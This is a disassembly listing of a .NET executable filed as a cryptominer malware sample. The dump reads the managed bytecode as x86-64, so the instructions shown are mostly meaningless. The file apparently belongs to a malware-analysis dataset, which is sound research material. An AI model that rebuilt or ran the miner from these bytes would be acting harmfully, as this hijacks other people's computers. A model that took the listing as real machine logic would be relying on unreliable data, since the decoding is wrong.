
malware_samples/miner/ca9f83290ef684d52030f1b5a9ac2b55d3265a1d4f6a1360c44d1fce7e9be971.exe:     file format pei-x86-64


Disassembly of section .text:

0000000140002000 <.text>:
   140002000:	48 00 00             	rex.W add %al,(%rax)
   140002003:	00 02                	add    %al,(%rdx)
   140002005:	00 05 00 bc 24 00    	add    %al,0x24bc00(%rip)        # 0x14024dc0b
   14000200b:	00 1c 12             	add    %bl,(%rdx,%rdx,1)
   14000200e:	00 00                	add    %al,(%rax)
   140002010:	01 00                	add    %eax,(%rax)
   140002012:	00 00                	add    %al,(%rax)
   140002014:	01 00                	add    %eax,(%rax)
   140002016:	00 06                	add    %al,(%rsi)
	...
   140002050:	0b 30                	or     (%rax),%esi
   140002052:	02 00                	add    (%rax),%al
   140002054:	26 00 00             	es add %al,(%rax)
   140002057:	00 00                	add    %al,(%rax)
   140002059:	00 00                	add    %al,(%rax)
   14000205b:	00 7e 03             	add    %bh,0x3(%rsi)
   14000205e:	00 00                	add    %al,(%rax)
   140002060:	04 28                	add    $0x28,%al
   140002062:	08 00                	or     %al,(%rax)
   140002064:	00 0a                	add    %cl,(%rdx)
   140002066:	17                   	(bad)
   140002067:	28 04 00             	sub    %al,(%rax,%rax,1)
   14000206a:	00 06                	add    %al,(%rsi)
   14000206c:	80 01 00             	addb   $0x0,(%rcx)
   14000206f:	00 04 28             	add    %al,(%rax,%rbp,1)
   140002072:	02 00                	add    (%rax),%al
   140002074:	00 06                	add    %al,(%rsi)
   140002076:	de 09                	fimuls (%rcx)
   140002078:	26 16                	es (bad)
   14000207a:	28 09                	sub    %cl,(%rcx)
   14000207c:	00 00                	add    %al,(%rax)
   14000207e:	0a de                	or     %dh,%bl
   140002080:	00 2a                	add    %ch,(%rdx)
   140002082:	00 00                	add    %al,(%rax)
   140002084:	01 10                	add    %edx,(%rax)
   140002086:	00 00                	add    %al,(%rax)
   140002088:	00 00                	add    %al,(%rax)
   14000208a:	00 00                	add    %al,(%rax)
   14000208c:	1c 1c                	sbb    $0x1c,%al
   14000208e:	00 09                	add    %cl,(%rcx)
   140002090:	0b 00                	or     (%rax),%eax
   140002092:	00 01                	add    %al,(%rcx)
   140002094:	1b 30                	sbb    (%rax),%esi
   140002096:	04 00                	add    $0x0,%al
   140002098:	0e                   	(bad)
   140002099:	02 00                	add    (%rax),%al
   14000209b:	00 01                	add    %al,(%rcx)
   14000209d:	00 00                	add    %al,(%rax)
   14000209f:	11 72 01             	adc    %esi,0x1(%rdx)
   1400020a2:	00 00                	add    %al,(%rax)
   1400020a4:	70 0a                	jo     0x1400020b0
   1400020a6:	16                   	(bad)
   1400020a7:	0b 73 0a             	or     0xa(%rbx),%esi
   1400020aa:	00 00                	add    %al,(%rax)
   1400020ac:	0a 0c 08             	or     (%rax,%rcx,1),%cl
   1400020af:	19 6f 0b             	sbb    %ebp,0xb(%rdi)
   1400020b2:	00 00                	add    %al,(%rax)
   1400020b4:	0a 72 03             	or     0x3(%rdx),%dh
   1400020b7:	00 00                	add    %al,(%rax)
   1400020b9:	70 08                	jo     0x1400020c3
   1400020bb:	73 0c                	jae    0x1400020c9
   1400020bd:	00 00                	add    %al,(%rax)
   1400020bf:	0a 0d 09 6f 0d 00    	or     0xd6f09(%rip),%cl        # 0x1400d8fce
   1400020c5:	00 0a                	add    %cl,(%rdx)
   1400020c7:	09 72 1b             	or     %esi,0x1b(%rdx)
   1400020ca:	00 00                	add    %al,(%rax)
   1400020cc:	70 73                	jo     0x140002141
   1400020ce:	0e                   	(bad)
   1400020cf:	00 00                	add    %al,(%rax)
   1400020d1:	0a 73 0f             	or     0xf(%rbx),%dh
   1400020d4:	00 00                	add    %al,(%rax)
   1400020d6:	0a 28                	or     (%rax),%ch
   1400020d8:	10 00                	adc    %al,(%rax)
   1400020da:	00 0a                	add    %cl,(%rdx)
   1400020dc:	13 04 11             	adc    (%rcx,%rdx,1),%eax
   1400020df:	04 6f                	add    $0x6f,%al
   1400020e1:	11 00                	adc    %eax,(%rax)
   1400020e3:	00 0a                	add    %cl,(%rdx)
   1400020e5:	13 09                	adc    (%rcx),%ecx
   1400020e7:	2b 59 11             	sub    0x11(%rcx),%ebx
   1400020ea:	09 6f 12             	or     %ebp,0x12(%rdi)
   1400020ed:	00 00                	add    %al,(%rax)
   1400020ef:	0a 74 14 00          	or     0x0(%rsp,%rdx,1),%dh
   1400020f3:	00 01                	add    %al,(%rcx)
   1400020f5:	13 05 06 13 0a 1b    	adc    0x1b0a1306(%rip),%eax        # 0x15b0a3401
   1400020fb:	8d 01                	lea    (%rcx),%eax
   1400020fd:	00 00                	add    %al,(%rax)
   1400020ff:	01 13                	add    %edx,(%rbx)
   140002101:	0b 11                	or     (%rcx),%edx
   140002103:	0b 16                	or     (%rsi),%edx
   140002105:	11 0a                	adc    %ecx,(%rdx)
   140002107:	a2 11 0b 17 72 89 00 	movabs %al,0x7000008972170b11
   14000210e:	00 70 
   140002110:	a2 11 0b 18 11 05 72 	movabs %al,0x8d720511180b11
   140002117:	8d 00 
   140002119:	00 70 6f             	add    %dh,0x6f(%rax)
   14000211c:	13 00                	adc    (%rax),%eax
   14000211e:	00 0a                	add    %cl,(%rdx)
   140002120:	a2 11 0b 19 72 89 00 	movabs %al,0x7000008972190b11
   140002127:	00 70 
   140002129:	a2 11 0b 1a 11 05 72 	movabs %al,0xab7205111a0b11
   140002130:	ab 00 
   140002132:	00 70 6f             	add    %dh,0x6f(%rax)
   140002135:	13 00                	adc    (%rax),%eax
   140002137:	00 0a                	add    %cl,(%rdx)
   140002139:	a2 11 0b 28 14 00 00 	movabs %al,0xa0a000014280b11
   140002140:	0a 0a 
   140002142:	11 09                	adc    %ecx,(%rcx)
   140002144:	6f                   	outsl  (%rsi),(%dx)
   140002145:	15 00 00 0a 2d       	adc    $0x2d0a0000,%eax
   14000214a:	9e                   	sahf
   14000214b:	de 0c 11             	fimuls (%rcx,%rdx,1)
   14000214e:	09 2c 07             	or     %ebp,(%rdi,%rax,1)
   140002151:	11 09                	adc    %ecx,(%rcx)
   140002153:	6f                   	outsl  (%rsi),(%dx)
   140002154:	16                   	(bad)
   140002155:	00 00                	add    %al,(%rax)
   140002157:	0a dc                	or     %ah,%bl
   140002159:	09 72 b5             	or     %esi,-0x4b(%rdx)
   14000215c:	00 00                	add    %al,(%rax)
   14000215e:	70 28                	jo     0x140002188
   140002160:	03 00                	add    (%rax),%eax
   140002162:	00 06                	add    %al,(%rsi)
   140002164:	72 68                	jb     0x1400021ce
   140002166:	01 00                	add    %eax,(%rax)
   140002168:	70 28                	jo     0x140002192
   14000216a:	03 00                	add    (%rax),%eax
   14000216c:	00 06                	add    %al,(%rsi)
   14000216e:	28 17                	sub    %dl,(%rdi)
   140002170:	00 00                	add    %al,(%rax)
   140002172:	0a 73 0e             	or     0xe(%rbx),%dh
   140002175:	00 00                	add    %al,(%rax)
   140002177:	0a 73 0f             	or     0xf(%rbx),%dh
   14000217a:	00 00                	add    %al,(%rax)
   14000217c:	0a 28                	or     (%rax),%ch
   14000217e:	10 00                	adc    %al,(%rax)
   140002180:	00 0a                	add    %cl,(%rdx)
   140002182:	13 06                	adc    (%rsi),%eax
   140002184:	11 06                	adc    %eax,(%rsi)
   140002186:	6f                   	outsl  (%rsi),(%dx)
   140002187:	11 00                	adc    %eax,(%rax)
   140002189:	00 0a                	add    %cl,(%rdx)
   14000218b:	13 0c 2b             	adc    (%rbx,%rbp,1),%ecx
   14000218e:	44 11 0c 6f          	adc    %r9d,(%rdi,%rbp,2)
   140002192:	12 00                	adc    (%rax),%al
   140002194:	00 0a                	add    %cl,(%rdx)
   140002196:	74 14                	je     0x1400021ac
   140002198:	00 00                	add    %al,(%rax)
   14000219a:	01 13                	add    %edx,(%rbx)
   14000219c:	07                   	(bad)
   14000219d:	11 07                	adc    %eax,(%rdi)
   14000219f:	2c 32                	sub    $0x32,%al
   1400021a1:	11 07                	adc    %eax,(%rdi)
   1400021a3:	72 9a                	jb     0x14000213f
   1400021a5:	01 00                	add    %eax,(%rax)
   1400021a7:	70 6f                	jo     0x140002218
   1400021a9:	13 00                	adc    (%rax),%eax
   1400021ab:	00 0a                	add    %cl,(%rdx)
   1400021ad:	2c 24                	sub    $0x24,%al
   1400021af:	11 07                	adc    %eax,(%rdi)
   1400021b1:	72 9a                	jb     0x14000214d
   1400021b3:	01 00                	add    %eax,(%rax)
   1400021b5:	70 6f                	jo     0x140002226
   1400021b7:	13 00                	adc    (%rax),%eax
   1400021b9:	00 0a                	add    %cl,(%rdx)
   1400021bb:	6f                   	outsl  (%rsi),(%dx)
   1400021bc:	18 00                	sbb    %al,(%rax)
   1400021be:	00 0a                	add    %cl,(%rdx)
   1400021c0:	72 b2                	jb     0x140002174
   1400021c2:	01 00                	add    %eax,(%rax)
   1400021c4:	70 28                	jo     0x1400021ee
   1400021c6:	03 00                	add    (%rax),%eax
   1400021c8:	00 06                	add    %al,(%rsi)
   1400021ca:	6f                   	outsl  (%rsi),(%dx)
   1400021cb:	19 00                	sbb    %eax,(%rax)
   1400021cd:	00 0a                	add    %cl,(%rdx)
   1400021cf:	2c 02                	sub    $0x2,%al
   1400021d1:	17                   	(bad)
   1400021d2:	0b 11                	or     (%rcx),%edx
   1400021d4:	0c 6f                	or     $0x6f,%al
   1400021d6:	15 00 00 0a 2d       	adc    $0x2d0a0000,%eax
   1400021db:	b3 de                	mov    $0xde,%bl
   1400021dd:	0c 11                	or     $0x11,%al
   1400021df:	0c 2c                	or     $0x2c,%al
   1400021e1:	07                   	(bad)
   1400021e2:	11 0c 6f             	adc    %ecx,(%rdi,%rbp,2)
   1400021e5:	16                   	(bad)
   1400021e6:	00 00                	add    %al,(%rax)
   1400021e8:	0a dc                	or     %ah,%bl
   1400021ea:	7e 03                	jle    0x1400021ef
   1400021ec:	00 00                	add    %al,(%rax)
   1400021ee:	04 28                	add    $0x28,%al
   1400021f0:	1a 00                	sbb    (%rax),%al
   1400021f2:	00 0a                	add    %cl,(%rdx)
   1400021f4:	2c 24                	sub    $0x24,%al
   1400021f6:	07                   	(bad)
   1400021f7:	3a 9d 00 00 00 06    	cmp    0x6000000(%rbp),%bl
   1400021fd:	72 e4                	jb     0x1400021e3
   1400021ff:	01 00                	add    %eax,(%rax)
   140002201:	70 1b                	jo     0x14000221e
   140002203:	6f                   	outsl  (%rsi),(%dx)
   140002204:	1b 00                	sbb    (%rax),%eax
   140002206:	00 0a                	add    %cl,(%rdx)
   140002208:	16                   	(bad)
   140002209:	2f                   	(bad)
   14000220a:	0f 06                	clts
   14000220c:	72 f2                	jb     0x140002200
   14000220e:	01 00                	add    %eax,(%rax)
   140002210:	70 1b                	jo     0x14000222d
   140002212:	6f                   	outsl  (%rsi),(%dx)
   140002213:	1b 00                	sbb    (%rax),%eax
   140002215:	00 0a                	add    %cl,(%rdx)
   140002217:	16                   	(bad)
   140002218:	32 7f 7e             	xor    0x7e(%rdi),%bh
   14000221b:	03 00                	add    (%rax),%eax
   14000221d:	00 04 28             	add    %al,(%rax,%rbp,1)
   140002220:	1a 00                	sbb    (%rax),%al
   140002222:	00 0a                	add    %cl,(%rdx)
   140002224:	2c 08                	sub    $0x8,%al
   140002226:	7e 02                	jle    0x14000222a
   140002228:	00 00                	add    %al,(%rax)
   14000222a:	04 18                	add    $0x18,%al
   14000222c:	31 5f 16             	xor    %ebx,0x16(%rdi)
   14000222f:	80 02 00             	addb   $0x0,(%rdx)
   140002232:	00 04 7e             	add    %al,(%rsi,%rdi,2)
   140002235:	03 00                	add    (%rax),%eax
   140002237:	00 04 7e             	add    %al,(%rsi,%rdi,2)
   14000223a:	01 00                	add    %eax,(%rax)
   14000223c:	00 04 16             	add    %al,(%rsi,%rdx,1)
   14000223f:	28 04 00             	sub    %al,(%rax,%rax,1)
   140002242:	00 06                	add    %al,(%rsi)
   140002244:	28 1c 00             	sub    %bl,(%rax,%rax,1)
   140002247:	00 0a                	add    %cl,(%rdx)
   140002249:	73 1d                	jae    0x140002268
   14000224b:	00 00                	add    %al,(%rax)
   14000224d:	0a 13                	or     (%rbx),%dl
   14000224f:	08 11                	or     %dl,(%rcx)
   140002251:	08 7e 03             	or     %bh,0x3(%rsi)
   140002254:	00 00                	add    %al,(%rax)
   140002256:	04 6f                	add    $0x6f,%al
   140002258:	1e                   	(bad)
   140002259:	00 00                	add    %al,(%rax)
   14000225b:	0a 11                	or     (%rcx),%dl
   14000225d:	08 17                	or     %dl,(%rdi)
   14000225f:	6f                   	outsl  (%rsi),(%dx)
   140002260:	1f                   	(bad)
   140002261:	00 00                	add    %al,(%rax)
   140002263:	0a 11                	or     (%rcx),%dl
   140002265:	08 7e 03             	or     %bh,0x3(%rsi)
   140002268:	00 00                	add    %al,(%rax)
   14000226a:	04 28                	add    $0x28,%al
   14000226c:	20 00                	and    %al,(%rax)
   14000226e:	00 0a                	add    %cl,(%rdx)
   140002270:	6f                   	outsl  (%rsi),(%dx)
   140002271:	21 00                	and    %eax,(%rax)
   140002273:	00 0a                	add    %cl,(%rdx)
   140002275:	11 08                	adc    %ecx,(%rax)
   140002277:	17                   	(bad)
   140002278:	6f                   	outsl  (%rsi),(%dx)
   140002279:	22 00                	and    (%rax),%al
   14000227b:	00 0a                	add    %cl,(%rdx)
   14000227d:	11 08                	adc    %ecx,(%rax)
   14000227f:	28 23                	sub    %ah,(%rbx)
   140002281:	00 00                	add    %al,(%rax)
   140002283:	0a 26                	or     (%rsi),%ah
   140002285:	16                   	(bad)
   140002286:	28 09                	sub    %cl,(%rcx)
   140002288:	00 00                	add    %al,(%rax)
   14000228a:	0a 2b                	or     (%rbx),%ch
   14000228c:	0c 7e                	or     $0x7e,%al
   14000228e:	02 00                	add    (%rax),%al
   140002290:	00 04 17             	add    %al,(%rdi,%rdx,1)
   140002293:	58                   	pop    %rax
   140002294:	80 02 00             	addb   $0x0,(%rdx)
   140002297:	00 04 20             	add    %al,(%rax,%riz,1)
   14000229a:	b8 88 00 00 28       	mov    $0x28000088,%eax
   14000229f:	24 00                	and    $0x0,%al
   1400022a1:	00 0a                	add    %cl,(%rdx)
   1400022a3:	28 02                	sub    %al,(%rdx)
   1400022a5:	00 00                	add    %al,(%rax)
   1400022a7:	06                   	(bad)
   1400022a8:	de 03                	fiadds (%rbx)
   1400022aa:	26 de 00             	es fiadds (%rax)
   1400022ad:	2a 00                	sub    (%rax),%al
   1400022af:	00 41 4c             	add    %al,0x4c(%rcx)
   1400022b2:	00 00                	add    %al,(%rax)
   1400022b4:	02 00                	add    (%rax),%al
   1400022b6:	00 00                	add    %al,(%rax)
   1400022b8:	47 00 00             	rex.RXB add %r8b,(%r8)
   1400022bb:	00 66 00             	add    %ah,0x0(%rsi)
   1400022be:	00 00                	add    %al,(%rax)
   1400022c0:	ad                   	lods   (%rsi),%eax
   1400022c1:	00 00                	add    %al,(%rax)
   1400022c3:	00 0c 00             	add    %cl,(%rax,%rax,1)
   1400022c6:	00 00                	add    %al,(%rax)
   1400022c8:	00 00                	add    %al,(%rax)
   1400022ca:	00 00                	add    %al,(%rax)
   1400022cc:	02 00                	add    (%rax),%al
   1400022ce:	00 00                	add    %al,(%rax)
   1400022d0:	ed                   	in     (%dx),%eax
   1400022d1:	00 00                	add    %al,(%rax)
   1400022d3:	00 51 00             	add    %dl,0x0(%rcx)
   1400022d6:	00 00                	add    %al,(%rax)
   1400022d8:	3e 01 00             	ds add %eax,(%rax)
   1400022db:	00 0c 00             	add    %cl,(%rax,%rax,1)
	...
   1400022ea:	00 00                	add    %al,(%rax)
   1400022ec:	0a 02                	or     (%rdx),%al
   1400022ee:	00 00                	add    %al,(%rax)
   1400022f0:	0a 02                	or     (%rdx),%al
   1400022f2:	00 00                	add    %al,(%rax)
   1400022f4:	03 00                	add    (%rax),%eax
   1400022f6:	00 00                	add    %al,(%rax)
   1400022f8:	0b 00                	or     (%rax),%eax
   1400022fa:	00 01                	add    %al,(%rcx)
   1400022fc:	5e                   	pop    %rsi
   1400022fd:	28 25 00 00 0a 02    	sub    %ah,0x20a0000(%rip)        # 0x1420a2303
   140002303:	28 26                	sub    %ah,(%rsi)
   140002305:	00 00                	add    %al,(%rax)
   140002307:	0a 16                	or     (%rsi),%dl
   140002309:	28 04 00             	sub    %al,(%rax,%rax,1)
   14000230c:	00 06                	add    %al,(%rsi)
   14000230e:	6f                   	outsl  (%rsi),(%dx)
   14000230f:	27                   	(bad)
   140002310:	00 00                	add    %al,(%rax)
   140002312:	0a 2a                	or     (%rdx),%ch
   140002314:	1b 30                	sbb    (%rax),%esi
   140002316:	04 00                	add    $0x0,%al
   140002318:	bb 00 00 00 02       	mov    $0x2000000,%ebx
   14000231d:	00 00                	add    %al,(%rax)
   14000231f:	11 28                	adc    %ebp,(%rax)
   140002321:	25 00 00 0a 72       	and    $0x720a0000,%eax
   140002326:	fa                   	cli
   140002327:	01 00                	add    %eax,(%rax)
   140002329:	70 6f                	jo     0x14000239a
   14000232b:	28 00                	sub    %al,(%rax)
   14000232d:	00 0a                	add    %cl,(%rdx)
   14000232f:	0a 72 1c             	or     0x1c(%rdx),%dh
   140002332:	02 00                	add    (%rax),%al
   140002334:	70 28                	jo     0x14000235e
   140002336:	25 00 00 0a 72       	and    $0x720a0000,%eax
   14000233b:	1f                   	(bad)
   14000233c:	04 00                	add    $0x0,%al
   14000233e:	70 6f                	jo     0x1400023af
   140002340:	28 00                	sub    %al,(%rax)
   140002342:	00 0a                	add    %cl,(%rdx)
   140002344:	1f                   	(bad)
   140002345:	64 73 29             	fs jae 0x140002371
   140002348:	00 00                	add    %al,(%rax)
   14000234a:	0a 0b                	or     (%rbx),%cl
   14000234c:	73 2a                	jae    0x140002378
   14000234e:	00 00                	add    %al,(%rax)
   140002350:	0a 13                	or     (%rbx),%dl
   140002352:	06                   	(bad)
   140002353:	11 06                	adc    %eax,(%rsi)
   140002355:	20 00                	and    %al,(%rax)
   140002357:	01 00                	add    %eax,(%rax)
   140002359:	00 6f 2b             	add    %ch,0x2b(%rdi)
   14000235c:	00 00                	add    %al,(%rax)
   14000235e:	0a 11                	or     (%rcx),%dl
   140002360:	06                   	(bad)
   140002361:	17                   	(bad)
   140002362:	6f                   	outsl  (%rsi),(%dx)
   140002363:	2c 00                	sub    $0x0,%al
   140002365:	00 0a                	add    %cl,(%rdx)
   140002367:	11 06                	adc    %eax,(%rsi)
   140002369:	0c 03                	or     $0x3,%al
   14000236b:	2d 11 08 07 1f       	sub    $0x1f070811,%eax
   140002370:	10 6f 2d             	adc    %ch,0x2d(%rdi)
   140002373:	00 00                	add    %al,(%rax)
   140002375:	0a 06                	or     (%rsi),%al
   140002377:	6f                   	outsl  (%rsi),(%dx)
   140002378:	2e 00 00             	cs add %al,(%rax)
   14000237b:	0a 2b                	or     (%rbx),%ch
   14000237d:	0f 08                	invd
   14000237f:	07                   	(bad)
   140002380:	1f                   	(bad)
   140002381:	10 6f 2d             	adc    %ch,0x2d(%rdi)
   140002384:	00 00                	add    %al,(%rax)
   140002386:	0a 06                	or     (%rsi),%al
   140002388:	6f                   	outsl  (%rsi),(%dx)
   140002389:	2f                   	(bad)
   14000238a:	00 00                	add    %al,(%rax)
   14000238c:	0a 0d 73 30 00 00    	or     0x3073(%rip),%cl        # 0x140005405
   140002392:	0a 13                	or     (%rbx),%dl
   140002394:	04 11                	add    $0x11,%al
   140002396:	04 09                	add    $0x9,%al
   140002398:	17                   	(bad)
   140002399:	73 31                	jae    0x1400023cc
   14000239b:	00 00                	add    %al,(%rax)
   14000239d:	0a 13                	or     (%rbx),%dl
   14000239f:	05 11 05 02 16       	add    $0x16020511,%eax
   1400023a4:	02 8e 69 6f 32 00    	add    0x326f69(%rsi),%cl
   1400023aa:	00 0a                	add    %cl,(%rdx)
   1400023ac:	11 05 6f 33 00 00    	adc    %eax,0x336f(%rip)        # 0x140005721
   1400023b2:	0a de                	or     %dh,%bl
   1400023b4:	0c 11                	or     $0x11,%al
   1400023b6:	05 2c 07 11 05       	add    $0x511072c,%eax
   1400023bb:	6f                   	outsl  (%rsi),(%dx)
   1400023bc:	16                   	(bad)
   1400023bd:	00 00                	add    %al,(%rax)
   1400023bf:	0a dc                	or     %ah,%bl
   1400023c1:	11 04 6f             	adc    %eax,(%rdi,%rbp,2)
   1400023c4:	34 00                	xor    $0x0,%al
   1400023c6:	00 0a                	add    %cl,(%rdx)
   1400023c8:	13 07                	adc    (%rdi),%eax
   1400023ca:	de 0c 11             	fimuls (%rcx,%rdx,1)
   1400023cd:	04 2c                	add    $0x2c,%al
   1400023cf:	07                   	(bad)
   1400023d0:	11 04 6f             	adc    %eax,(%rdi,%rbp,2)
   1400023d3:	16                   	(bad)
   1400023d4:	00 00                	add    %al,(%rax)
   1400023d6:	0a dc                	or     %ah,%bl
   1400023d8:	11 07                	adc    %eax,(%rdi)
   1400023da:	2a 00                	sub    (%rax),%al
   1400023dc:	01 1c 00             	add    %ebx,(%rax,%rax,1)
   1400023df:	00 02                	add    %al,(%rdx)
   1400023e1:	00 80 00 15 95 00    	add    %al,0x951500(%rax)
   1400023e7:	0c 00                	or     $0x0,%al
   1400023e9:	00 00                	add    %al,(%rax)
   1400023eb:	00 02                	add    %al,(%rdx)
   1400023ed:	00 75 00             	add    %dh,0x0(%rbp)
   1400023f0:	37                   	(bad)
   1400023f1:	ac                   	lods   (%rsi),%al
   1400023f2:	00 0c 00             	add    %cl,(%rax,%rax,1)
   1400023f5:	00 00                	add    %al,(%rax)
   1400023f7:	00 1b                	add    %bl,(%rbx)
   1400023f9:	30 02                	xor    %al,(%rdx)
   1400023fb:	00 48 00             	add    %cl,0x0(%rax)
   1400023fe:	00 00                	add    %al,(%rax)
   140002400:	03 00                	add    (%rax),%eax
   140002402:	00 11                	add    %dl,(%rcx)
   140002404:	73 1d                	jae    0x140002423
   140002406:	00 00                	add    %al,(%rax)
   140002408:	0a 0a                	or     (%rdx),%cl
   14000240a:	06                   	(bad)
   14000240b:	02 6f 1e             	add    0x1e(%rdi),%ch
   14000240e:	00 00                	add    %al,(%rax)
   140002410:	0a 06                	or     (%rsi),%al
   140002412:	03 6f 35             	add    0x35(%rdi),%ebp
   140002415:	00 00                	add    %al,(%rax)
   140002417:	0a 06                	or     (%rsi),%al
   140002419:	28 36                	sub    %dh,(%rsi)
   14000241b:	00 00                	add    %al,(%rax)
   14000241d:	0a 6f 21             	or     0x21(%rdi),%ch
   140002420:	00 00                	add    %al,(%rax)
   140002422:	0a 06                	or     (%rsi),%al
   140002424:	17                   	(bad)
   140002425:	6f                   	outsl  (%rsi),(%dx)
   140002426:	1f                   	(bad)
   140002427:	00 00                	add    %al,(%rax)
   140002429:	0a 06                	or     (%rsi),%al
   14000242b:	17                   	(bad)
   14000242c:	6f                   	outsl  (%rsi),(%dx)
   14000242d:	22 00                	and    (%rax),%al
   14000242f:	00 0a                	add    %cl,(%rdx)
   140002431:	06                   	(bad)
   140002432:	16                   	(bad)
   140002433:	6f                   	outsl  (%rsi),(%dx)
   140002434:	37                   	(bad)
   140002435:	00 00                	add    %al,(%rax)
   140002437:	0a 06                	or     (%rsi),%al
   140002439:	17                   	(bad)
   14000243a:	6f                   	outsl  (%rsi),(%dx)
   14000243b:	38 00                	cmp    %al,(%rax)
   14000243d:	00 0a                	add    %cl,(%rdx)
   14000243f:	06                   	(bad)
   140002440:	28 23                	sub    %ah,(%rbx)
   140002442:	00 00                	add    %al,(%rax)
   140002444:	0a 26                	or     (%rsi),%ah
   140002446:	de 03                	fiadds (%rbx)
   140002448:	26 de 00             	es fiadds (%rax)
   14000244b:	2a 01                	sub    (%rcx),%al
   14000244d:	10 00                	adc    %al,(%rax)
   14000244f:	00 00                	add    %al,(%rax)
   140002451:	00 00                	add    %al,(%rax)
   140002453:	00 44 44 00          	add    %al,0x0(%rsp,%rax,2)
   140002457:	03 0b                	add    (%rbx),%ecx
   140002459:	00 00                	add    %al,(%rax)
   14000245b:	01 03                	add    %eax,(%rbx)
   14000245d:	30 02                	xor    %al,(%rdx)
   14000245f:	00 4a 00             	add    %cl,0x0(%rdx)
   140002462:	00 00                	add    %al,(%rax)
   140002464:	00 00                	add    %al,(%rax)
   140002466:	00 00                	add    %al,(%rax)
   140002468:	16                   	(bad)
   140002469:	8d 29                	lea    (%rcx),%ebp
   14000246b:	00 00                	add    %al,(%rax)
   14000246d:	01 80 01 00 00 04    	add    %eax,0x4000001(%rax)
   140002473:	16                   	(bad)
   140002474:	80 02 00             	addb   $0x0,(%rdx)
   140002477:	00 04 28             	add    %al,(%rax,%rbp,1)
   14000247a:	39 00                	cmp    %eax,(%rax)
   14000247c:	00 0a                	add    %cl,(%rdx)
   14000247e:	73 3a                	jae    0x1400024ba
   140002480:	00 00                	add    %al,(%rax)
   140002482:	0a 20                	or     (%rax),%ah
   140002484:	20 02                	and    %al,(%rdx)
   140002486:	00 00                	add    %al,(%rax)
   140002488:	6f                   	outsl  (%rsi),(%dx)
   140002489:	3b 00                	cmp    (%rax),%eax
   14000248b:	00 0a                	add    %cl,(%rdx)
   14000248d:	2d 09 1f 1a 28       	sub    $0x281a1f09,%eax
   140002492:	3c 00                	cmp    $0x0,%al
   140002494:	00 0a                	add    %cl,(%rdx)
   140002496:	2b 05 28 36 00 00    	sub    0x3628(%rip),%eax        # 0x140005ac4
   14000249c:	0a 72 61             	or     0x61(%rdx),%dh
   14000249f:	04 00                	add    $0x0,%al
   1400024a1:	70 28                	jo     0x1400024cb
   1400024a3:	03 00                	add    (%rax),%eax
   1400024a5:	00 06                	add    %al,(%rsi)
   1400024a7:	28 3d 00 00 0a 80    	sub    %bh,-0x7ff60000(%rip)        # 0xc00a24ad
   1400024ad:	03 00                	add    (%rax),%eax
   1400024af:	00 04 2a             	add    %al,(%rdx,%rbp,1)
   1400024b2:	1e                   	(bad)
   1400024b3:	02 28                	add    (%rax),%ch
   1400024b5:	3e 00 00             	ds add %al,(%rax)
   1400024b8:	0a 2a                	or     (%rdx),%ch
   1400024ba:	00 00                	add    %al,(%rax)
   1400024bc:	42 53                	rex.X push %rbx
   1400024be:	4a                   	rex.WX
   1400024bf:	42 01 00             	rex.X add %eax,(%rax)
   1400024c2:	01 00                	add    %eax,(%rax)
   1400024c4:	00 00                	add    %al,(%rax)
   1400024c6:	00 00                	add    %al,(%rax)
   1400024c8:	0c 00                	or     $0x0,%al
   1400024ca:	00 00                	add    %al,(%rax)
   1400024cc:	76 34                	jbe    0x140002502
   1400024ce:	2e 30 2e             	cs xor %ch,(%rsi)
   1400024d1:	33 30                	xor    (%rax),%esi
   1400024d3:	33 31                	xor    (%rcx),%esi
   1400024d5:	39 00                	cmp    %eax,(%rax)
   1400024d7:	00 00                	add    %al,(%rax)
   1400024d9:	00 05 00 6c 00 00    	add    %al,0x6c00(%rip)        # 0x1400090df
   1400024df:	00 0c 04             	add    %cl,(%rsp,%rax,1)
   1400024e2:	00 00                	add    %al,(%rax)
   1400024e4:	23 7e 00             	and    0x0(%rsi),%edi
   1400024e7:	00 78 04             	add    %bh,0x4(%rax)
   1400024ea:	00 00                	add    %al,(%rax)
   1400024ec:	e8 06 00 00 23       	call   0x1630024f7
   1400024f1:	53                   	push   %rbx
   1400024f2:	74 72                	je     0x140002566
   1400024f4:	69 6e 67 73 00 00 00 	imul   $0x73,0x67(%rsi),%ebp
   1400024fb:	00 60 0b             	add    %ah,0xb(%rax)
   1400024fe:	00 00                	add    %al,(%rax)
   140002500:	94                   	xchg   %eax,%esp
   140002501:	04 00                	add    $0x0,%al
   140002503:	00 23                	add    %ah,(%rbx)
   140002505:	55                   	push   %rbp
   140002506:	53                   	push   %rbx
   140002507:	00 f4                	add    %dh,%ah
   140002509:	0f 00 00             	sldt   (%rax)
   14000250c:	10 00                	adc    %al,(%rax)
   14000250e:	00 00                	add    %al,(%rax)
   140002510:	23 47 55             	and    0x55(%rdi),%eax
   140002513:	49                   	rex.WB
   140002514:	44 00 00             	add    %r8b,(%rax)
   140002517:	00 04 10             	add    %al,(%rax,%rdx,1)
   14000251a:	00 00                	add    %al,(%rax)
   14000251c:	18 02                	sbb    %al,(%rdx)
   14000251e:	00 00                	add    %al,(%rax)
   140002520:	23 42 6c             	and    0x6c(%rdx),%eax
   140002523:	6f                   	outsl  (%rsi),(%dx)
   140002524:	62                   	(bad)
   140002525:	00 00                	add    %al,(%rax)
   140002527:	00 00                	add    %al,(%rax)
   140002529:	00 00                	add    %al,(%rax)
   14000252b:	00 02                	add    %al,(%rdx)
   14000252d:	00 00                	add    %al,(%rax)
   14000252f:	01 57 1d             	add    %edx,0x1d(%rdi)
   140002532:	02 00                	add    (%rax),%al
   140002534:	09 00                	or     %eax,(%rax)
   140002536:	00 00                	add    %al,(%rax)
   140002538:	00 fa                	add    %bh,%dl
   14000253a:	25 33 00 16 00       	and    $0x160033,%eax
   14000253f:	00 01                	add    %al,(%rcx)
   140002541:	00 00                	add    %al,(%rax)
   140002543:	00 2d 00 00 00 02    	add    %ch,0x2000000(%rip)        # 0x142002549
   140002549:	00 00                	add    %al,(%rax)
   14000254b:	00 03                	add    %al,(%rbx)
   14000254d:	00 00                	add    %al,(%rax)
   14000254f:	00 07                	add    %al,(%rdi)
   140002551:	00 00                	add    %al,(%rax)
   140002553:	00 05 00 00 00 3e    	add    %al,0x3e000000(%rip)        # 0x17e002559
   140002559:	00 00                	add    %al,(%rax)
   14000255b:	00 01                	add    %al,(%rcx)
   14000255d:	00 00                	add    %al,(%rax)
   14000255f:	00 07                	add    %al,(%rdi)
   140002561:	00 00                	add    %al,(%rax)
   140002563:	00 03                	add    %al,(%rbx)
   140002565:	00 00                	add    %al,(%rax)
   140002567:	00 01                	add    %al,(%rcx)
   140002569:	00 00                	add    %al,(%rax)
   14000256b:	00 03                	add    %al,(%rbx)
